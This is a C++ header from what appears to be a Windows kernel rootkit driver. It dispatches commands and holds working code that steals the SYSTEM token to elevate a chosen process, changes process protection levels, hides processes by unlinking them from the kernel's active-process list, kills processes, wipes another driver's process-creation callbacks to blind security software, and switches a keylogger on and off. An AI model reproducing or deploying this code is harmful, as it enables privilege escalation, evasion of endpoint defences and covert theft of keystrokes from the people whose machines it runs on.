#pragma once

#include <ntifs.h>
#include <wdf.h>
#include "Globals.hpp"
#include "ProcessUtils.hpp"
#include "DriverMeta.hpp"
#include "Misc.hpp"
#include "WinTypes.hpp"
#include "AddressUtils.hpp"
#include "Vector.hpp"
#include "CallbackUtils.hpp"
#include "AutoLock.hpp"

// --------------------------------------------------------------------------------------------------------
// Command

enum COMMAND_TYPE 
{
    NONE,
    KILL_PROCESS,
    PROTECT_PROCESS,
    ELEVATE_TOKEN,
    HIDE_PROCESS,
    ENUM_PROCESS_CALLBACKS,
    ENUM_THREAD_CALLBACKS,
    ERASE_CALLBACKS,
    START_KEYLOGGER,
    GET_KEYLOG
};

typedef struct _PROTECT_PROCESS_PAYLOAD {
    COMMAND_TYPE cmdType;
    ULONG pid;
    BYTE newProtectionLevel;
} PROTECT_PROCESS_PAYLOAD;

typedef struct _EMPTY_PAYLOAD {
    COMMAND_TYPE cmdType;
};

typedef struct _PID_PAYLOAD {
    COMMAND_TYPE cmdType;
    ULONG pid;
};

typedef struct _DWORD_PAYLOAD {
    COMMAND_TYPE cmdType;
    DWORD dw;
};

typedef struct _WSTR_PAYLOAD {
    COMMAND_TYPE cmdType;
    WCHAR charString[64];
};

using KILL_PROCESS_PAYLOAD = _PID_PAYLOAD;
using HIDE_PROCESS_PAYLOAD = _PID_PAYLOAD;
using ELEVATE_PROCESS_PAYLOAD = _PID_PAYLOAD;
using ERASE_CALLBACKS_PAYLOAD = _WSTR_PAYLOAD;
using ENUM_PROCESS_CALLBACKS_PAYLOAD = _EMPTY_PAYLOAD;
using ENUM_THREAD_CALLBACKS_PAYLOAD = _EMPTY_PAYLOAD;
using START_KEYLOGGER_PAYLOAD = _DWORD_PAYLOAD;
using GET_KEYLOG_PAYLOAD = _EMPTY_PAYLOAD;

// --------------------------------------------------------------------------------------------------------

typedef struct _CALLBACK_DATA {
    UINT64 driverBase;
    UINT64 offset;
    WCHAR driverName[64];
} CALLBACK_DATA;

// --------------------------------------------------------------------------------------------------------

NTSTATUS BeCmd_KillProcess(HANDLE pid);
NTSTATUS BeCmd_ProtectProcess(ULONG pid, BYTE newProcessProtection);
NTSTATUS BeCmd_ElevateProcessAcessToken(HANDLE pid);
NTSTATUS BeCmd_KillProcess(HANDLE pid);
NTSTATUS BeCmd_HideProcess(HANDLE pid);
NTSTATUS BeCmd_EnumerateCallbacks(CALLBACK_TYPE type);
NTSTATUS BeCmd_EraseCallbacks(PWCHAR targetDriver);
NTSTATUS BeCmd_StartKeylogger(BOOLEAN start);

// --------------------------------------------------------------------------------------------------------

/**
 * TODO
 */
NTSTATUS 
BeExecuteCommand(PVOID commandBuffer)
{
    NTSTATUS status;

    DWORD commandType = ((DWORD*)commandBuffer)[0];

    switch (commandType)
    {
    case KILL_PROCESS:
        {
            ULONG targetPid = ((KILL_PROCESS_PAYLOAD*)commandBuffer)->pid;
            status = BeCmd_KillProcess(ULongToHandle(targetPid));
        }
        break;

    case ELEVATE_TOKEN:
        {
            ULONG targetPid = ((ELEVATE_PROCESS_PAYLOAD*)commandBuffer)->pid;
            status = BeCmd_ElevateProcessAcessToken(ULongToHandle(targetPid));
        }
        break;

    case PROTECT_PROCESS:
        {
            auto payload = ((PROTECT_PROCESS_PAYLOAD*)commandBuffer);
            status = BeCmd_ProtectProcess(payload->pid, payload->newProtectionLevel);
        }
        break;

    case HIDE_PROCESS:
        {
            ULONG targetPid = ((HIDE_PROCESS_PAYLOAD*)commandBuffer)->pid;
            status = BeCmd_HideProcess(ULongToHandle(targetPid));
        }
        break;

    case ENUM_PROCESS_CALLBACKS:
        {
            status = BeCmd_EnumerateCallbacks(CreateProcessNotifyRoutine);
        }
        break;

    case ENUM_THREAD_CALLBACKS:
        {
            status = BeCmd_EnumerateCallbacks(CreateThreadNotifyRoutine);
        }
        break;

    case ERASE_CALLBACKS:
        { 
            PWCHAR targetDriver = ((ERASE_CALLBACKS_PAYLOAD*)commandBuffer)->charString;
            status = BeCmd_EraseCallbacks(targetDriver);
        }
        break;

    case START_KEYLOGGER:
        {
            BOOLEAN start = (BOOLEAN)((START_KEYLOGGER_PAYLOAD*)commandBuffer)->dw;
            status = BeCmd_StartKeylogger(start);
        }
        break;
    }

    return status;
}

/**
 * Method for setting the protection of an arbitrary process by PID.
 *
 * @param pid PID of the target process
 * @param newProtectionLevel new level of protection to apply
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_ProtectProcess(ULONG pid, BYTE newProtectionLevel)
{
    LOG_MSG("Changing pid %i protection to %i\r\n", pid, newProtectionLevel);

    // Lookup process
    PEPROCESS process = BeGetEprocessByPid(pid);
    if (process == NULL)
    {
        ObDereferenceObject(process);
        return STATUS_INVALID_PARAMETER_1;
    }

    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + BeGetEprocessProcessProtectionOffset();

    LOG_MSG("Current protection level: %i\r\n", *((BYTE*)(EProtectionLevel)));

    // assign new protection level
    *((BYTE*)(EProtectionLevel)) = newProtectionLevel;

    LOG_MSG("New protection level: %i\r\n", *((BYTE*)(EProtectionLevel)));

    ObDereferenceObject(process);
    return STATUS_SUCCESS;
}

/**
 * Sets target process access token to a SYSTEM token.
 *
 * @param pid PID of target process.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_ElevateProcessAcessToken(HANDLE pid)
{
    PEPROCESS privilegedProcess, targetProcess;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    ULONG tokenOffset = BeGetAccessTokenOffset();

    // Lookup target process
    NtStatus = PsLookupProcessByProcessId(pid, &targetProcess);
    if (NtStatus != 0)
    {
        LOG_MSG("PID %i not found\r\n", HandleToUlong(pid));
        ObDereferenceObject(targetProcess);
        return NtStatus;
    }

    // Lookup system process (handle for pid 4)
    NtStatus = PsLookupProcessByProcessId((HANDLE)4, &privilegedProcess);
    if (NtStatus != 0)
    {
        LOG_MSG("System process not found with pid 4\r\n");
        ObDereferenceObject(privilegedProcess);
        ObDereferenceObject(targetProcess);
        return NtStatus;
    }

    //LOG_MSG("Token Target: %i", (ULONG)targetProcess + tokenOffset);
    //LOG_MSG("Token System: %i", (ULONG)privilegedProcess + tokenOffset);

    // Replace target process token with system token
    *(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)privilegedProcess + tokenOffset);

    ObDereferenceObject(privilegedProcess);
    ObDereferenceObject(targetProcess);
    return NtStatus;
}

/**
 * Kills a process by PID.
 *
 * @param pid PID of the process to kill
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_KillProcess(HANDLE pid)
{
    HANDLE hProcess = NULL;

    PEPROCESS prc = BeGetEprocessByPid(HandleToULong(pid));
    if (prc == NULL)
    {
        return STATUS_INVALID_PARAMETER;
    }
    ObDereferenceObject(prc);

    CLIENT_ID ci;
    ci.UniqueProcess = pid;
    ci.UniqueThread = 0;

    OBJECT_ATTRIBUTES obj;
    obj.Length = sizeof(obj);
    obj.Attributes = 0;
    obj.ObjectName = 0;
    obj.RootDirectory = 0;
    obj.SecurityDescriptor = 0;
    obj.SecurityQualityOfService = 0;

    BeGlobals::pZwOpenProcess(&hProcess, 1, &obj, &ci);
    NTSTATUS NtStatus = BeGlobals::pZwTerminateProcess(hProcess, 0);
    BeGlobals::pZwClose(hProcess);

    LOG_MSG("KillProcess %i \r\n", NtStatus);
    return NtStatus;
}

/**
 * Hides a process by removing it from the linked list of active processes referenced in EPROCESS.
 *
 * @param pid PID of target process.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_HideProcess(HANDLE pid)
{
    PEPROCESS targetProcess = BeGetEprocessByPid(HandleToULong(pid));
    if (targetProcess == NULL)
    {
        return STATUS_INVALID_PARAMETER;
    }

    {
        AutoLock<FastMutex> _lock(BeGlobals::processListLock);
        PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + BeGetProcessLinkedListOffset());
        RemoveEntryList(processListEntry);
    }
    
    ObDereferenceObject(targetProcess);
    return STATUS_SUCCESS;
}

/**
 * Enumerates kernel callbacks
 *
 * @param type Type of callback to resolve
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_EnumerateCallbacks(CALLBACK_TYPE type)
{
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    LOG_MSG("IOCTL enumerate callbacks\r\n");

    // TODO
    /*
    __try
    {
        // find callbacks
        auto callbackVector = BeEnumerateKernelCallbacks(type);

        // setup buffer
        ULONG dwDataSize = callbackVector.size() * sizeof(CALLBACK_DATA);

        // write buffer to output buffer
        for (INT i = 0; i < callbackVector.size(); ++i)
        {
            RtlCopyMemory(&(pOutputBuffer[i].driverBase), &(callbackVector[i].driverBase), sizeof(UINT64));
            RtlCopyMemory(&(pOutputBuffer[i].offset), &(callbackVector[i].offset), sizeof(UINT64));
            if (!BeIsStringNull(callbackVector[i].driverName))
            {
                SIZE_T strLen = wcslen(callbackVector[i].driverName) + 1;
                DbgPrint("Size: %i of %ws\r\n", strLen, callbackVector[i].driverName);
                RtlCopyMemory(&(pOutputBuffer[i].driverName), callbackVector[i].driverName, strLen * sizeof(WCHAR));
            }
        }

        LOG_MSG("Copied\r\n");

        NtStatus = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        NtStatus = GetExceptionCode();
    }
    */

    return NtStatus;
}

/**
 * Replaces all kernel callbacks of a specified driver with empty callbacks.
 *
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_EraseCallbacks(PWCHAR targetDriver)
{
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

    // TODO: also get type of callback. for now hardcoded to createprocess callbacks
    NtStatus = BeReplaceKernelCallbacksOfDriver(targetDriver, CreateProcessNotifyRoutine);

    return NtStatus;
}

/**
 * Starts or stops the keylogger.
 *
 * @param start TRUE to start, FALSE to stop
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_StartKeylogger(BOOLEAN start)
{
    BeGlobals::logKeys = start;

    return STATUS_SUCCESS;
}